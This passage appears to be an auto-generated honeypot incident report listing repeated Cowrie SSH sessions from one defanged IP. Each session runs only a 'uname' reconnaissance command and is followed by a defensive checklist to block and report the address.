- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0db2025df595

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:09 |
| **Last Seen** | 2026-09-05 18:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:09:09` | `cowrie.session.connect` |
| `2026-09-05 18:09:09` | `cowrie.client.version` |
| `2026-09-05 18:09:09` | `cowrie.client.kex` |
| `2026-09-05 18:09:09` | `cowrie.login.success` |
| `2026-09-05 18:09:10` | `cowrie.session.params` |
| `2026-09-05 18:09:10` | `cowrie.command.input` |
| `2026-09-05 18:09:10` | `cowrie.log.closed` |
| `2026-09-05 18:09:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09ff939c3f63

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:09 |
| **Last Seen** | 2026-09-05 18:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:09:24` | `cowrie.session.connect` |
| `2026-09-05 18:09:24` | `cowrie.client.version` |
| `2026-09-05 18:09:24` | `cowrie.client.kex` |
| `2026-09-05 18:09:24` | `cowrie.login.success` |
| `2026-09-05 18:09:24` | `cowrie.session.params` |
| `2026-09-05 18:09:24` | `cowrie.command.input` |
| `2026-09-05 18:09:24` | `cowrie.log.closed` |
| `2026-09-05 18:09:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4a1064e750b

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:09 |
| **Last Seen** | 2026-09-05 18:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:09:38` | `cowrie.session.connect` |
| `2026-09-05 18:09:38` | `cowrie.client.version` |
| `2026-09-05 18:09:38` | `cowrie.client.kex` |
| `2026-09-05 18:09:38` | `cowrie.login.success` |
| `2026-09-05 18:09:39` | `cowrie.session.params` |
| `2026-09-05 18:09:39` | `cowrie.command.input` |
| `2026-09-05 18:09:39` | `cowrie.log.closed` |
| `2026-09-05 18:09:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0e2e4ec9498

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:09 |
| **Last Seen** | 2026-09-05 18:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:09:52` | `cowrie.session.connect` |
| `2026-09-05 18:09:52` | `cowrie.client.version` |
| `2026-09-05 18:09:52` | `cowrie.client.kex` |
| `2026-09-05 18:09:52` | `cowrie.login.success` |
| `2026-09-05 18:09:53` | `cowrie.session.params` |
| `2026-09-05 18:09:53` | `cowrie.command.input` |
| `2026-09-05 18:09:53` | `cowrie.log.closed` |
| `2026-09-05 18:09:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1807d8bc48ff

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:10 |
| **Last Seen** | 2026-09-05 18:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:10:07` | `cowrie.session.connect` |
| `2026-09-05 18:10:07` | `cowrie.client.version` |
| `2026-09-05 18:10:07` | `cowrie.client.kex` |
| `2026-09-05 18:10:07` | `cowrie.login.success` |
| `2026-09-05 18:10:07` | `cowrie.session.params` |
| `2026-09-05 18:10:08` | `cowrie.command.input` |
| `2026-09-05 18:10:08` | `cowrie.log.closed` |
| `2026-09-05 18:10:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff89aa06c952

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:10 |
| **Last Seen** | 2026-09-05 18:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:10:21` | `cowrie.session.connect` |
| `2026-09-05 18:10:21` | `cowrie.client.version` |
| `2026-09-05 18:10:21` | `cowrie.client.kex` |
| `2026-09-05 18:10:22` | `cowrie.login.success` |
| `2026-09-05 18:10:22` | `cowrie.session.params` |
| `2026-09-05 18:10:22` | `cowrie.command.input` |
| `2026-09-05 18:10:22` | `cowrie.log.closed` |
| `2026-09-05 18:10:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-155f5fdab776

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:10 |
| **Last Seen** | 2026-09-05 18:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:10:36` | `cowrie.session.connect` |
| `2026-09-05 18:10:36` | `cowrie.client.version` |
| `2026-09-05 18:10:36` | `cowrie.client.kex` |
| `2026-09-05 18:10:37` | `cowrie.login.success` |
| `2026-09-05 18:10:37` | `cowrie.session.params` |
| `2026-09-05 18:10:37` | `cowrie.command.input` |
| `2026-09-05 18:10:37` | `cowrie.log.closed` |
| `2026-09-05 18:10:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-660a10da6372

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:10 |
| **Last Seen** | 2026-09-05 18:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:10:51` | `cowrie.session.connect` |
| `2026-09-05 18:10:51` | `cowrie.client.version` |
| `2026-09-05 18:10:51` | `cowrie.client.kex` |
| `2026-09-05 18:10:51` | `cowrie.login.success` |
| `2026-09-05 18:10:52` | `cowrie.session.params` |
| `2026-09-05 18:10:52` | `cowrie.command.input` |
| `2026-09-05 18:10:52` | `cowrie.log.closed` |
| `2026-09-05 18:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-967e177fddd5

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:11 |
| **Last Seen** | 2026-09-05 18:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:11:06` | `cowrie.session.connect` |
| `2026-09-05 18:11:06` | `cowrie.client.version` |
| `2026-09-05 18:11:06` | `cowrie.client.kex` |
| `2026-09-05 18:11:06` | `cowrie.login.success` |
| `2026-09-05 18:11:07` | `cowrie.session.params` |
| `2026-09-05 18:11:07` | `cowrie.command.input` |
| `2026-09-05 18:11:07` | `cowrie.log.closed` |
| `2026-09-05 18:11:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-291463356745

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:11 |
| **Last Seen** | 2026-09-05 18:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:11:21` | `cowrie.session.connect` |
| `2026-09-05 18:11:21` | `cowrie.client.version` |
| `2026-09-05 18:11:21` | `cowrie.client.kex` |
| `2026-09-05 18:11:21` | `cowrie.login.success` |
| `2026-09-05 18:11:21` | `cowrie.session.params` |
| `2026-09-05 18:11:21` | `cowrie.command.input` |
| `2026-09-05 18:11:21` | `cowrie.log.closed` |
| `2026-09-05 18:11:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9339a8bf04e

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:11 |
| **Last Seen** | 2026-09-05 18:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:11:35` | `cowrie.session.connect` |
| `2026-09-05 18:11:35` | `cowrie.client.version` |
| `2026-09-05 18:11:35` | `cowrie.client.kex` |
| `2026-09-05 18:11:35` | `cowrie.login.success` |
| `2026-09-05 18:11:36` | `cowrie.session.params` |
| `2026-09-05 18:11:36` | `cowrie.command.input` |
| `2026-09-05 18:11:36` | `cowrie.log.closed` |
| `2026-09-05 18:11:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-448e7703d45e

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:11 |
| **Last Seen** | 2026-09-05 18:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:11:50` | `cowrie.session.connect` |
| `2026-09-05 18:11:50` | `cowrie.client.version` |
| `2026-09-05 18:11:50` | `cowrie.client.kex` |
| `2026-09-05 18:11:50` | `cowrie.login.success` |
| `2026-09-05 18:11:51` | `cowrie.session.params` |
| `2026-09-05 18:11:51` | `cowrie.command.input` |
| `2026-09-05 18:11:51` | `cowrie.log.closed` |
| `2026-09-05 18:11:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c99e9ea1a34f

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:12 |
| **Last Seen** | 2026-09-05 18:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:12:05` | `cowrie.session.connect` |
| `2026-09-05 18:12:05` | `cowrie.client.version` |
| `2026-09-05 18:12:05` | `cowrie.client.kex` |
| `2026-09-05 18:12:05` | `cowrie.login.success` |
| `2026-09-05 18:12:06` | `cowrie.session.params` |
| `2026-09-05 18:12:06` | `cowrie.command.input` |
| `2026-09-05 18:12:06` | `cowrie.log.closed` |
| `2026-09-05 18:12:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a66a101da5c

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:12 |
| **Last Seen** | 2026-09-05 18:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:12:20` | `cowrie.session.connect` |
| `2026-09-05 18:12:20` | `cowrie.client.version` |
| `2026-09-05 18:12:20` | `cowrie.client.kex` |
| `2026-09-05 18:12:20` | `cowrie.login.success` |
| `2026-09-05 18:12:21` | `cowrie.session.params` |
| `2026-09-05 18:12:21` | `cowrie.command.input` |
| `2026-09-05 18:12:21` | `cowrie.log.closed` |
| `2026-09-05 18:12:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4973350ba0c3

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:12 |
| **Last Seen** | 2026-09-05 18:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:12:35` | `cowrie.session.connect` |
| `2026-09-05 18:12:35` | `cowrie.client.version` |
| `2026-09-05 18:12:35` | `cowrie.client.kex` |
| `2026-09-05 18:12:35` | `cowrie.login.success` |
| `2026-09-05 18:12:36` | `cowrie.session.params` |
| `2026-09-05 18:12:36` | `cowrie.command.input` |
| `2026-09-05 18:12:36` | `cowrie.log.closed` |
| `2026-09-05 18:12:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7831735b285b

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:12 |
| **Last Seen** | 2026-09-05 18:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:12:51` | `cowrie.session.connect` |
| `2026-09-05 18:12:51` | `cowrie.client.version` |
| `2026-09-05 18:12:51` | `cowrie.client.kex` |
| `2026-09-05 18:12:51` | `cowrie.login.success` |
| `2026-09-05 18:12:51` | `cowrie.session.params` |
| `2026-09-05 18:12:51` | `cowrie.command.input` |
| `2026-09-05 18:12:51` | `cowrie.log.closed` |
| `2026-09-05 18:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8985f3ab022

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:13 |
| **Last Seen** | 2026-09-05 18:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:13:06` | `cowrie.session.connect` |
| `2026-09-05 18:13:06` | `cowrie.client.version` |
| `2026-09-05 18:13:06` | `cowrie.client.kex` |
| `2026-09-05 18:13:06` | `cowrie.login.success` |
| `2026-09-05 18:13:07` | `cowrie.session.params` |
| `2026-09-05 18:13:07` | `cowrie.command.input` |
| `2026-09-05 18:13:07` | `cowrie.log.closed` |
| `2026-09-05 18:13:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6351fd788a09

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:13 |
| **Last Seen** | 2026-09-05 18:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:13:21` | `cowrie.session.connect` |
| `2026-09-05 18:13:21` | `cowrie.client.version` |
| `2026-09-05 18:13:21` | `cowrie.client.kex` |
| `2026-09-05 18:13:21` | `cowrie.login.success` |
| `2026-09-05 18:13:21` | `cowrie.session.params` |
| `2026-09-05 18:13:21` | `cowrie.command.input` |
| `2026-09-05 18:13:22` | `cowrie.log.closed` |
| `2026-09-05 18:13:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5811d5b8f494

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:13 |
| **Last Seen** | 2026-09-05 18:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:13:36` | `cowrie.session.connect` |
| `2026-09-05 18:13:36` | `cowrie.client.version` |
| `2026-09-05 18:13:36` | `cowrie.client.kex` |
| `2026-09-05 18:13:36` | `cowrie.login.success` |
| `2026-09-05 18:13:37` | `cowrie.session.params` |
| `2026-09-05 18:13:37` | `cowrie.command.input` |
| `2026-09-05 18:13:37` | `cowrie.log.closed` |
| `2026-09-05 18:13:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db812b8438b5

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:13 |
| **Last Seen** | 2026-09-05 18:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:13:51` | `cowrie.session.connect` |
| `2026-09-05 18:13:51` | `cowrie.client.version` |
| `2026-09-05 18:13:51` | `cowrie.client.kex` |
| `2026-09-05 18:13:51` | `cowrie.login.success` |
| `2026-09-05 18:13:52` | `cowrie.session.params` |
| `2026-09-05 18:13:52` | `cowrie.command.input` |
| `2026-09-05 18:13:52` | `cowrie.log.closed` |
| `2026-09-05 18:13:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ccc8f506cbe

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:14 |
| **Last Seen** | 2026-09-05 18:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:14:06` | `cowrie.session.connect` |
| `2026-09-05 18:14:06` | `cowrie.client.version` |
| `2026-09-05 18:14:06` | `cowrie.client.kex` |
| `2026-09-05 18:14:06` | `cowrie.login.success` |
| `2026-09-05 18:14:07` | `cowrie.session.params` |
| `2026-09-05 18:14:07` | `cowrie.command.input` |
| `2026-09-05 18:14:07` | `cowrie.log.closed` |
| `2026-09-05 18:14:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11f261350d4d

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:14 |
| **Last Seen** | 2026-09-05 18:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:14:21` | `cowrie.session.connect` |
| `2026-09-05 18:14:21` | `cowrie.client.version` |
| `2026-09-05 18:14:21` | `cowrie.client.kex` |
| `2026-09-05 18:14:21` | `cowrie.login.success` |
| `2026-09-05 18:14:21` | `cowrie.session.params` |
| `2026-09-05 18:14:21` | `cowrie.command.input` |
| `2026-09-05 18:14:21` | `cowrie.log.closed` |
| `2026-09-05 18:14:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc62c555d577

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:14 |
| **Last Seen** | 2026-09-05 18:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:14:36` | `cowrie.session.connect` |
| `2026-09-05 18:14:36` | `cowrie.client.version` |
| `2026-09-05 18:14:36` | `cowrie.client.kex` |
| `2026-09-05 18:14:36` | `cowrie.login.success` |
| `2026-09-05 18:14:36` | `cowrie.session.params` |
| `2026-09-05 18:14:36` | `cowrie.command.input` |
| `2026-09-05 18:14:36` | `cowrie.log.closed` |
| `2026-09-05 18:14:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49f70486606c

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:14 |
| **Last Seen** | 2026-09-05 18:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:14:50` | `cowrie.session.connect` |
| `2026-09-05 18:14:50` | `cowrie.client.version` |
| `2026-09-05 18:14:50` | `cowrie.client.kex` |
| `2026-09-05 18:14:50` | `cowrie.login.success` |
| `2026-09-05 18:14:51` | `cowrie.session.params` |
| `2026-09-05 18:14:51` | `cowrie.command.input` |
| `2026-09-05 18:14:51` | `cowrie.log.closed` |
| `2026-09-05 18:14:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-663f9ae935da

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:15 |
| **Last Seen** | 2026-09-05 18:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:15:05` | `cowrie.session.connect` |
| `2026-09-05 18:15:05` | `cowrie.client.version` |
| `2026-09-05 18:15:05` | `cowrie.client.kex` |
| `2026-09-05 18:15:05` | `cowrie.login.success` |
| `2026-09-05 18:15:06` | `cowrie.session.params` |
| `2026-09-05 18:15:06` | `cowrie.command.input` |
| `2026-09-05 18:15:06` | `cowrie.log.closed` |
| `2026-09-05 18:15:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ceaa1e3d340

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:15 |
| **Last Seen** | 2026-09-05 18:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
